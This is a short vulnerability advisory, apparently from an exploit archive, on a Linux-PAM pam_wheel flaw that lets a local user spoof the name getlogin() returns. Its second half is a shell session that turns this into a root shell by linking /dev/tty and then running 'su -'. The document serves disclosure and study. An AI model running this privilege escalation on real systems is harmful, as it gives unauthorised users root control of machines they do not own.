@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/7929/info
+
+A vulnerability has been discovered in the Linux-Pam pam_wheel module. The problem exists in the way the module authenticates users under certain configurations. Specifically, if the module is configured to allow wheel group members to use the 'su' utility without supplying credentials and is not configured to verify the user's UID, it may be possible for a local attacker to elevated privileges.
+
+This can be accomplished by spoofing the users login named, returned by the getlogin() function, to that of a logged in user of the wheel group.
+
+Successful exploitation of this condition could ultimately result in an attacker gaining local root access on the target system. 
+
+$ w
+10:32am up 3:26, 2 users, load average: 0.01, 0.01, 0.00
+USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
+root tty1 - 7:13am 3:03m 0.30s 0.22s -bash
+farmer pts/0 172.16.60.5 10:32am 0.00s 0.00s ? -
+
+$ logname
+farmer
+
+$ ln /dev/tty tty1
+$ bash < tty1
+
+$ logname
+root
+
+$ su -
+# id
+uid=0(root) gid=0(root)
+groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) 
